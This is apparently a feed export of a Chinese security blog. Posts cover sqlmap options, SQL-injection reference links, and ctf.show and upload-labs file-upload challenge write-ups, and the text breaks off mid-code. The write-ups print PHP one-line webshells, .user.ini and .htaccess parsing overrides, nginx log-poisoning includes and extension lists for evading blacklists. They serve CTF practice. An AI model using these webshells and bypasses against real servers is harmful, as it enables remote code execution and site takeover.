        <content type="html"><![CDATA[<h3 id="基础sqlmap指令："><a href="#基础sqlmap指令：" class="headerlink" title="基础sqlmap指令："></a>基础sqlmap指令：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u https://www.evil.com?id=1 --level 3 --risk 3 -p id</span><br></pre></td></tr></table></figure><h3 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h3><p>–timeout&#x3D;设置http在几秒后超时</p><p>–ignore-timeouts忽略http超时</p><p>–output-dir&#x3D;目录设置sqlmap结果的输出路径</p><p>c:\users\用户名\AppData\Local\sqlmap\output\删除sqlite即清除缓存重新扫描</p><p>–test-filter&#x3D;mypayload1指定使用某payload</p><p>–test-skip&#x3D;mypayload1跳过某payload</p><p>–force-ssl告诉sqlmap测试的链接是https协议</p><p>–technique&#x3D;TECH  SQL注入技术测试（默认BEUST）</p><p>–start：指定开始的行（跑指定行数据）</p><p>–stop：指定结束的行</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 1.工具总结 </category>
          
          <category> 1.web安全工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入总结</title>
      <link href="/2022/02/18/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2022/02/18/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>bypass information_schema:<a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><p>sqlmap配合tamper脚本使用：<a href="https://greatagain.688023.cn/#/book/search/detail?id=XiSgaPZaJvcf&amp;type=1">https://greatagain.688023.cn/#/book/search/detail?id=XiSgaPZaJvcf&amp;type=1</a></p><p>测试方法</p><p>收集各种链接，编写自动化脚本，自动跑sqlfuzz字典，并检测该点是否注入点。</p><p>总之，能自动化的通通自动化，机械事情上，人不会比电脑做的更好。</p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 1.Web攻击 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入getshell</title>
      <link href="/2022/02/18/SQL%E6%B3%A8%E5%85%A5getshell/"/>
      <url>/2022/02/18/SQL%E6%B3%A8%E5%85%A5getshell/</url>
      
        <content type="html"><![CDATA[<p><a href="https://manning23.github.io/2019/07/23/MYSQL%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E5%86%99WebShell%E7%9A%845%E7%A7%8D%E6%96%B9%E5%BC%8F/">https://manning23.github.io/2019/07/23/MYSQL%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E5%86%99WebShell%E7%9A%845%E7%A7%8D%E6%96%B9%E5%BC%8F/</a></p><p><a href="https://www.cnblogs.com/c1e4r/articles/8902444.html">https://www.cnblogs.com/c1e4r/articles/8902444.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 1.Web攻击 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传总结</title>
      <link href="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/"/>
      <url>/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 1.Web攻击 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WEB入门_文件上传</title>
      <link href="/2022/02/14/WEB%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/02/14/WEB%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="web151JS校验"><a href="#web151JS校验" class="headerlink" title="web151JS校验"></a>web151JS校验</h4><h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><p>先上传png图片马，抓包改后缀为php。</p><h4 id="web152mime-type校验"><a href="#web152mime-type校验" class="headerlink" title="web152mime-type校验"></a>web152mime-type校验</h4><h5 id="解题1-1"><a href="#解题1-1" class="headerlink" title="解题1"></a>解题1</h5><p>先上传png图片马，抓包改后缀为php。</p><h4 id="web153-user-ini绕过"><a href="#web153-user-ini绕过" class="headerlink" title="web153 .user.ini绕过"></a>web153 .user.ini绕过</h4><h5 id="解题1-2"><a href="#解题1-2" class="headerlink" title="解题1"></a>解题1</h5><p>上传.user.ini文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure><p>上传shell.png图片马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure><h4 id="web154-短标签绕过"><a href="#web154-短标签绕过" class="headerlink" title="web154 短标签绕过"></a>web154 短标签绕过</h4><h5 id="解题1-3"><a href="#解题1-3" class="headerlink" title="解题1"></a>解题1</h5><p>上传.user.ini文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure><p>上传shell.png图片马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST[1])?&gt;//&lt;?php&gt;代替为&lt;?= ?&gt;</span><br></pre></td></tr></table></figure><p>如上，增加了对文件内容的校验，php关键字被过滤了。所以使用短标签绕过。</p><p>其余短标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;? ?&gt;//windows默认开启，Linux中需要配置</span><br><span class="line">&lt;% %&gt;//需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。</span><br></pre></td></tr></table></figure><p>其他方法实现php标签功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=”php”&gt; &lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="web155-短标签绕过"><a href="#web155-短标签绕过" class="headerlink" title="web155 短标签绕过"></a>web155 短标签绕过</h4><h5 id="解题1-4"><a href="#解题1-4" class="headerlink" title="解题1"></a>解题1</h5><p>与上一题思路一致。</p><h4 id="web156-花括号绕过"><a href="#web156-花括号绕过" class="headerlink" title="web156 花括号绕过"></a>web156 花括号绕过</h4><h5 id="解题1-5"><a href="#解题1-5" class="headerlink" title="解题1"></a>解题1</h5><p>上传.user.ini文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure><p>上传shell.png图片马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST&#123;1&#125;)?&gt;//中括号被过滤了，替换为花括号</span><br></pre></td></tr></table></figure><h4 id="web157-反引号绕过"><a href="#web157-反引号绕过" class="headerlink" title="web157 反引号绕过"></a>web157 反引号绕过</h4><h5 id="解题1-6"><a href="#解题1-6" class="headerlink" title="解题1"></a>解题1</h5><p>上传.user.ini文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure><p>上传shell.png：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac ../f*`?&gt;//[]、&#123;&#125;、system()等全被过滤了，&lt;?=``?&gt;的格式，直接命令执行</span><br></pre></td></tr></table></figure><h4 id="web158-反引号绕过"><a href="#web158-反引号绕过" class="headerlink" title="web158  反引号绕过"></a>web158  反引号绕过</h4><p>和上一题一样。</p><h4 id="web159-反引号绕过"><a href="#web159-反引号绕过" class="headerlink" title="web159 反引号绕过"></a>web159 反引号绕过</h4><p>和上一题一样</p><h4 id="web160-包含日志文件"><a href="#web160-包含日志文件" class="headerlink" title="web160 包含日志文件"></a>web160 包含日志文件</h4><h5 id="解题1-7"><a href="#解题1-7" class="headerlink" title="解题1"></a>解题1</h5><p>上传.user.ini文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure><p>上传shell.png：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;//[]、&#123;&#125;、system()、反引号、log等全被过滤了</span><br></pre></td></tr></table></figure><p>然后再请求头User-Agent字段写上一句话，这样一句话会被记录到nginx日志中：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，而这个文件会被shell.png中的代码包含，导致我们访问&#x2F;upload&#x2F;index.php的时候，日志会被包含，一句话木马也同时会被包含。</p><h4 id="web161-幻术文件头"><a href="#web161-幻术文件头" class="headerlink" title="web161 幻术文件头"></a>web161 幻术文件头</h4><p>幻术文件头，加一个GIF89a，其他和上题一样</p><h4 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h4>]]></content>
      
      
      <categories>
          
          <category> 1.CTF </category>
          
          <category> 1.ctf.show </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自助机越狱</title>
      <link href="/2022/02/08/%E8%87%AA%E5%8A%A9%E6%9C%BA%E8%B6%8A%E7%8B%B1/"/>
      <url>/2022/02/08/%E8%87%AA%E5%8A%A9%E6%9C%BA%E8%B6%8A%E7%8B%B1/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220208143244375.png" alt="image-20220208143244375"></p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 1.近源攻击 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记burp关于get、post转换的坑</title>
      <link href="/2022/01/30/%E8%AE%B0burp%E5%85%B3%E4%BA%8Eget%E3%80%81post%E8%BD%AC%E6%8D%A2%E7%9A%84%E5%9D%91/"/>
      <url>/2022/01/30/%E8%AE%B0burp%E5%85%B3%E4%BA%8Eget%E3%80%81post%E8%BD%AC%E6%8D%A2%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>get方法和post方法的区别，不单单是改一个方法头的问题，在GET报文转POST文时，要添加一些东西：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1，GET转为POST</span><br><span class="line">2，Content-Type:application/x-www-form-urlencoded</span><br><span class="line">3，Content-Length: 86 //这个86是POST传参的内容长度</span><br><span class="line">4，Origin: http://175caf72-e921-4de9-aa37-2d213c9444ef.node4.buuoj.cn:81</span><br><span class="line">5，Referer: http://175caf72-e921-4de9-aa37-2d213c9444ef.node4.buuoj.cn:81/?pleaseget=1</span><br><span class="line">6，POST传参的内容</span><br></pre></td></tr></table></figure><p>在burpsuite中，可以右击GET&#x2F;POST方法头，扩展列表里选择Change request method：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220130170255384.png" alt="image-20220130170255384"></p><p>一定要这样做，不然POST参数是有可能传不出去的。</p>]]></content>
      
      
      <categories>
          
          <category> 1.杂七杂八 </category>
          
          <category> 1.那些年爬过的坑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记assert木马遇到的坑</title>
      <link href="/2022/01/30/%E8%AE%B0assert%E6%9C%A8%E9%A9%AC%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
      <url>/2022/01/30/%E8%AE%B0assert%E6%9C%A8%E9%A9%AC%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>蚁剑是支持assert木马的，但不能使用默认编码器，要改成base64：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220130170813188.png" alt="image-20220130170813188"></p>]]></content>
      
      
      <categories>
          
          <category> 1.杂七杂八 </category>
          
          <category> 1.那些年爬过的坑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>uploadlab闯关笔记</title>
      <link href="/2022/01/22/uploadlab%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/22/uploadlab%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="Pass-01-JS校验"><a href="#Pass-01-JS校验" class="headerlink" title="Pass-01 JS校验"></a>Pass-01 JS校验</h4><h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><p>burpsuite绕过，先传一个jpg，再通过burpsuite拦截包并修改后缀为php：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220122095806675.png" alt="image-20220122095806675"></p><h5 id="解题2"><a href="#解题2" class="headerlink" title="解题2"></a>解题2</h5><p>通过浏览器开发者工具修改源js代码，将js代码校验块return chekfile()改成return true，使校验失效：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220122100103123.png" alt="image-20220122100103123"></p><h4 id="Pass-02-MIME校验"><a href="#Pass-02-MIME校验" class="headerlink" title="Pass-02 MIME校验"></a>Pass-02 MIME校验</h4><h5 id="解题1-1"><a href="#解题1-1" class="headerlink" title="解题1"></a>解题1</h5><p>修改Content-Type类型为允许类型即可，这里改为image&#x2F;jpg，代表图片</p><p>常见Content-Type类型有：</p><p>text&#x2F;plain 　　　　　　　 　文本类型<br> text&#x2F;css  　　　　　　　 　 css类型<br> text&#x2F;html 　　 　　　　　 　html类型<br> application&#x2F;x-javascript 　  　js类型<br> application&#x2F;json　　　　　   json类型<br> image&#x2F;png jpeg gif　　　　 　 image&#x2F;*</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220122100501522.png" alt="image-20220122100501522"></p><span id="more"></span><h4 id="Pass-03-黑名单"><a href="#Pass-03-黑名单" class="headerlink" title="Pass-03 黑名单"></a>Pass-03 黑名单</h4><h5 id="解题1-2"><a href="#解题1-2" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<span class="comment">//如果UPLOAD_PATH文件存在</span></span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);<span class="comment">//黑名单数组</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);<span class="comment">//获得上传文件文件名，并移除两侧空白字符</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);<span class="comment">//获得文件后缀</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//后缀转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;<span class="comment">//如果后缀名不在黑名单数组里</span></span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];<span class="comment">//获得临时文件名</span></span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;<span class="comment">//文件重命名，并拼接上传路径            </span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;<span class="comment">//把临时文件正式存储到上传目录</span></span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;<span class="comment">//标记上传完成</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim()//移除字符串两侧空格，或指定字符。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&quot;upload_file&quot;][&quot;name&quot;]//[&#x27;upload_file&#x27;]是html中定义的上传文件名，[&#x27;name&#x27;]代表获取文件名，还有其他变量名代表上传文件的其他数据</span><br></pre></td></tr></table></figure><p>使用php4&#x2F;php5&#x2F;phtml等后缀代替php</p><p>其他环境下可替换后缀有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ASP: asa/cer/cdx</span><br><span class="line">ASPX: ashx/asmx/ascx</span><br><span class="line">PHP: php4/php5/phtml</span><br><span class="line">JSP: jspx/jspf</span><br></pre></td></tr></table></figure><h4 id="Pass-04-黑名单，-htaccess绕过"><a href="#Pass-04-黑名单，-htaccess绕过" class="headerlink" title="Pass-04 黑名单，.htaccess绕过"></a>Pass-04 黑名单，.htaccess绕过</h4><p><strong>注：.htaccess文件只对apache服务器默认有效，nginx服务器要经过设置后.htaccess才会生效</strong></p><h5 id="解题1-3"><a href="#解题1-3" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与Pass-03相比，丰富了黑名单，但取消了上传后文件重命名，上传文件会以原名保存在服务器。</p><p>可以使用.htaccess文件修改上传文件夹配置，如下代码的含义是：phpinfo.jpg将以代码格式解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;phpinfo.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h4 id="Pass-05-黑名单，-user-ini绕过"><a href="#Pass-05-黑名单，-user-ini绕过" class="headerlink" title="Pass-05 黑名单，.user.ini绕过"></a>Pass-05 黑名单，.user.ini绕过</h4><p><strong>注：.user.ini只适用于fastCGI服务器</strong></p><h5 id="解题1-4"><a href="#解题1-4" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span 